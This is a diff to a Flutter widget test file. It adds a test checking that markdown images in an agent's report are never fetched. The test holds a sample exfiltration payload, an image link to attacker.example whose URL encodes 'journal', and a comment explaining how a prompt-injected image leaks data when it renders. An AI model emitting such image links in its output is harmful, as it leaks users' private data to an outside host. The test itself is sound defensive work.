@@ -107,6 +107,18 @@ void main() {
       await tester.pump();
       expect(visited, [('#query-evidence-1', '1'), ('#query-evidence-1', '1')]);
     });
+    testWidgets('an image in agent text is never fetched', (tester) async {
+      // A prompt-injected image would leak whatever its URL encodes the
+      // moment the report is shown.
+      await _pumpView(
+        tester,
+        'Report ![x](https://attacker.example/pixel.png?q=journal) done.',
+      );
+
+      expect(find.byType(Image), findsNothing);
+      expect(find.text('Image from attacker.example not loaded'), findsOne);
+    });
+
     testWidgets('renders GptMarkdown with provided text', (tester) async {
       const markdownText = '# Hello World\n\nThis is a test.';
 
